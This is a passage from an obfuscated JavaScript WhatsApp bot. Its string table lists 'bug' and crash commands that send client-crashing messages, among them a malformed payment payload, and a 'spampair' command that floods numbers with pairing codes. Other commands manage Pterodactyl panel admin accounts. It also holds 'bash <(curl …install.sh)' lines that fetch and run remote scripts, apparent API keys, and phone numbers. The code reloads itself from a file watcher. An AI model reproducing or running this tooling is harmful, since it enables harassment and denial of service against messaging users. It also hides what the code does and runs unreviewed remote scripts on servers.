ᴇɴɪɢᴍᴀ]\n│ ᯤ ᴜɴɪɴsᴛᴀʟʟᴛʜᴇᴍᴀ\n┗─────────────❐", "waUploadToServer", "10240", "readFileSync", "🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉", "enable", "pagination", '17gb', "Berikut list admin:\n\n", 'json', 'quoted', "bgCyan", "public", "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0", "reverse", "𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️", 'cpu', "PENGGUNAAN .domain1 hostname|167.29.379.23", "Khusus Dalam Group Bego", "https://api.cloudflare.com/client/v4/zones/", "*USER NOT FOUND*", "email", "Asia/Jayapura", "╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇ཀ͜͡🐉        )\n║- 𝐒𝐜 𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇 𝑪͢𝒓𝒂ͯ͢𝒔𝒉友\n│🎭 ɴᴀᴍᴇ : ", "./all/uploader", "KHUSUS OWNER", "hidetag", "\n🔥LANGUAGE: ", "Asia/Jakarta\n", "916909137213", '250', "fromCharCode", "🔥⃰͜͡⭑𝐕𝐱͢𝐎⭑͜͡🔥⃰", "Berhasil mengirim bug ke @", "\n│▬▭「 🩸⃟༑⌁⃰ 𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇ཀ͜͡🐉 」▭▬\n│       🩸⃟༑⌁⃰⿻ Botz Wa ཀ͜͡🐉\n┗━━━━━━━━━━━━━━━━━━⬣\n\n╭──(        ⿻ Tools Menu〽️ ⿻        )\n┏─『 `TOOLS MENU` 』\n│ ᯤ ᴇɴᴄ [ᴄᴏᴅᴇ]\n│ ᯤ ᴇɴᴄᴇʏᴘᴛ [ᴄᴏᴅᴇ]\n│ ᯤ ᴛᴏᴜʀʟ\n│ ᯤ ᴀɪ [ᴛᴇᴋs]\n┗─────────────❐", "Selamat Petang 🌆", "𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗪𝗜𝗡𝗚𝗦 𝗦𝗔𝗕𝗔𝗥 𝗬𝗔 𝗠𝗔𝗡𝗜𝗘𝗭", " Cek aja (", "updateBlockStatus", "*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n𝐑𝐢𝐳𝐱𝐳𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟🎭", "caption", "\n\n ⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟  ⿻", "linkgc", "npm", "./Virtex/notif4.js", "𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝗥𝗜𝗭𝗫𝗫 𝗪𝗔𝗡𝗚𝗦𝗔𝗙𝗙", "05:00:00", "5uZOYXtR7bzG8N-E4MiJ4EDCYIzc34tmoqDnU9Ov", "key", "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "waitt.....! sedang memuat", "selectedButtonId", "\n║🎭 ᴘᴇʀɪғɪx : 𝐦𝐮𝐥𝐭𝐢\n║🎭 ʀᴜɴᴛɪᴍᴇ : ", "1406352VKUWMP", "xmed ", "𝗣𝗥𝗢𝗦𝗘𝗦 𝗨𝗡𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗧𝗛𝗘𝗠𝗘 𝗗𝗜𝗠𝗨𝗟𝗔𝗜 𝗠𝗢𝗛𝗢𝗡 𝗧𝗨𝗡𝗚𝗚𝗨 𝟯 𝗠𝗘𝗡𝗜𝗧 𝗞𝗘𝗗𝗘𝗣𝗔𝗡", "7GB", "download", "bash <(curl https://raw.githubusercontent.com/Rizxcode/thema/main/install.sh)", "enc", "host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)", '212', "xip ", "map", "yellow", "pix_static_code", "location", "mana ip nya", "5GB", "Bot auto Installer RizxzWangsaff🦅🇮🇩\n", 'ready', "570", "language", "Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!", "530", "admin", "stringify", "@gmail.com", "toString", "https://telegra.ph/file/342162094e5a96fa45d47.jpg", "domain1", "review_and_pay", "310", "menubug", 'match', '1715880173', " 62xxxx", "\n👤USERNAME: ", '.toolsmenu', "259705pruhUb", "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=", "TheRzxWangsaff", "format", "/api/application/servers?page=", '590', "participant", "success", "whatsapp.com", 'INQUIRY', "23:59:00", "root_admin", "indexOf", "Gunakan perintah ", "bash <( curl -s https://raw.githubusercontent.com/Ibzz-Official/Install-Theme-Pterodactyl-By-Ibzz-Official/main/install.sh)", "floor", "Katasandi atau IP tidak valid", " and signal ", "Successfully Activate Auto Chat", "current_page", "Hore", "Total Users: ", "1398@gmail.com", "root", '19GB', "10GB", " enable -- _mengaktifkan_\n", "post", "substr", 'pushName', "magenta", "message", "application/json", "Ãª¦¾ꦾ", "2GB", "1gb", "14240", "unli", "then", "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑰𝒐𝒔𝒔🐉", "18GB", "5138", "Maaf Hanya Untuk RizxzWangsaff", "xmed", "STDOUT: ", "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true", "split", "20gb", "./Media/Menu.jpg", "Î̬N̬̂F̬̂Î̬N̬̂Î̬X̬̂   Ĉ̬R̬̂Â̬Ĥ̬", "installpanelv3", "🚫⃰͜͡⭑𝐓𝐝͢𝐗⭑͜͡🚫⃰", "919366316008", "220", "parse", "requestRegistrationCode", "vasionbeta ", "pending", 'length', "20GB", "6GB", "1715876003", "cache", "BERHASIL RESTART ULANG", " Telah Menjadi Premium!", 'username', "owner", "Sent", "mtype", "⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻", "19:00:00", "uuid", "text", "13240", "util", "yes\n", 'decodeJid', ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}", "𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇🐉", "xlow", "15240", "./Media/BugRizxz.jpg", "VnK7dBRfFo8yduwFqvSwDUEsMD-rW7EY_kReWVoF", "6gb", "videoMessage", "\n⎙─➤ *🔐PASSWORD* : ", "𝐑𝐈𝐙", "test", "write", 'shift', "𝑨𝒍𝒍 𝑴𝒆𝒏𝒖〽️", "1024", "23gb", "🩸⃟༑⌁⃰T̥ͦo̥ͦo̥ͦl̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉", "\n\nNOTE :\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801\n=====================================\n", "20240", "⌜ 𝑵𝑬𝑾 𝑩𝑬𝑻𝑨 ⌟", "self", "⌜ 𝐈𝚯𝐒 ⌟", "meta", "/api/application/users/", "14gb", "bcmem", "remoteJid", "[ PESAN ]", "2512180JBMYCB", "./Virtex/xeontext6.js", "GET", "T̬̂R̬̂Â̬Ŝ̬Ĥ  ̬ L̬̂Ô̬Ĉ̬K̬̂", "9kHTLEi", "8gb", "buttonsResponseMessage", '1GB', "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=", "𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️", "nativeFlowResponseMessage", "Text :", "resolve", "HALOO DEKK😹", "getObfuscatedCode", '19240', "panel", "3072", "payment_info", "150", "addowner", "invalid_string", '/30)', "\n *🔐PASSWORD* : ", "/api/application/users?page=", "slice", "Bot Bukan Admin Bego", '10:00:00', "listusr ", "BEGIN:VCARD\n\nVERSION:3.0\n\nN:", ".spampair", "Please read the Terms of Service", "store-panel.online", "exec", "uninstalltheme ipvps,password", '1684161893', "it's deactivated", "🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉", "listResponseMessage", "Khusus Admin", "\nDurasi Video 1-9 Detik", "Asia/Jakarta", "𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️", "tempban", "301308vbXrDs", "Berikut adalah daftar server:\n\n", "\n║▬▭▬▭▬▭▬▭▬▭\n│🎭 ᴄʀᴇᴀᴛᴏʀ :  𝐑𝐢𝐳𝐱𝐳𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟\n║🎭 ɴᴏ ᴄʀᴇᴀᴛᴏʀ : @", "450", "requestPairingCode", '.tempban', "/api/application/users", "listsrv", "penis", "9GB", "installpanelv1 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)", "🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠", "encrypt", "replace", "𝐔𝐝𝐚𝐡 𝐁𝐢𝐬𝐚 𝐂𝐫𝐞𝐚𝐭𝐞 𝐒𝐚𝐦𝐩𝐞 𝟐𝟓𝐆𝐁, 𝐌𝐚𝐬𝐢 𝐍𝐠𝐞𝐥𝐮𝐧𝐣𝐚𝐤 𝐂𝐫𝐞𝐚𝐭𝐞 𝐔𝐧𝐥𝐢 🗿 !", "𝐒𝐔𝐂𝐂𝐄𝐒 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐖𝐈𝐍𝐆𝐒 𝐂𝐄𝐊 𝐏𝐀𝐒𝐓𝐈 𝐇𝐀𝐓𝐈 𝐍𝐘𝐀 𝐔𝐃𝐀𝐇 𝐇𝐈𝐉𝐀𝐔😁", ".allmenu", ".net", "hit", "*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n\n\n👤USERNAME :  ", "@whiskeysockets/baileys", '5gb', "7168", "author", "attributes", "memory", 'createnode', 'sms', "120", "participants", "tourl", "Selamat Siang 🌤️", "Example:\n ", " Username,@tag/nomor\n\nContoh :\n", "xrzx", "selectedRowId", '610', "# Succes Spam Pairing Code - Number : ", "360", "705824bJFMmP", "3GB", "toadmin", "16gb", "installpanelv2", "\nitem1.X-ABLabel:Ponsel\nEND:VCARD", "remove", "\nNAME: ", '𝐑𝐈', "18240", "DELETE", "13GB", "/api/application/nests/5/eggs/", "unlinkSync", "ip tidak valid", "𝐑𝐈𝐙𝐗𝐙 𝐖𝐀𝐍𝐆𝐂𝐀𝐏𝐏", "\nTYPE: user\n\n📡ID: ", "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑩𝒆𝒕𝒂𝒂🐉", "galaxy_message", "13gb", "0@s.whatsapp.net", "./TheGetsuzoZhiro", "data", "PHOTO", "Bot 𝐁𝐘 𝐑𝐢𝐳𝐱𝐳 𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅😈", "delusr", "content", "\n⎙─➤ *🌐LOGIN* : ", "conversation", "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER", "Ex : ", "Bug RizxzWangcapp Pasti C1 Nih Contohnya ", " 6285702447728", "BRL", 'repeat', '42srFGRU', "T̬̂R̬̂Â̬V ̬̂ Î̬Ô̬Ŝ̬", "Bearer ", "Unli", "https://telegra.ph/file/b9e707fbbbea9277c9a0e.jpg"];
  _0x3b8b = function () {
    return _0x43a5fd;
  };
  return _0x3b8b();
}
let file = require[_0x597c(684)](__filename);
fs[_0x597c(353)](file, () => {
  fs[_0x597c(397)](file);
  console[_0x597c(949)](chalk[_0x597c(869)]("Update " + __filename));
  delete require[_0x597c(629)][file];
  require(file);
});